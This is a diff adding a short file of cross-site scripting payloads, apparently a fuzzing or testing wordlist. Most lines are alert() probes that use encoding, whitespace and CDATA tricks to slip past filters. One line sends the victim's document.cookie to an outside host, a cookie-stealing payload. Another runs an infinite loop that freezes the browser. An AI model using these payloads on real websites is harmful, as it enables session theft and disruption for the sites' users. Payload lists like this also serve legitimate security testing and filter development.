@@ -1,0 +1,25 @@
+"><script>"
+"><script>alert(1)</script>
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+">xxx<P>yyy
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+&ltscript&gtalert(document.cookie);</script>
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+'';!--"<XSS>=&{()}
+'><script>alert(document.cookie);</script>
+'><script>alert(document.cookie)</script>
+<<script>alert("XSS");//<</script>
+<script>alert("XSS")</script>
+<script>alert(document.cookie)</script>
+<IMG%20"""><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG%20DYNSRC="javascript:alert('XSS')">
+<IMG%20LOWSRC="javascript:alert('XSS')">
+<IMG%20SRC="%20&#14;%20%20javascript:alert('XSS');">
+<IMG%20SRC="jav%20ascript:alert('XSS');">
+<IMG%20SRC="jav&#x09;ascript:alert('XSS');">
+<IMG%20SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG%20SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG%20SRC="javascript:alert('XSS')"
+<IMG%20SRC="javascript:alert('XSS');">
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
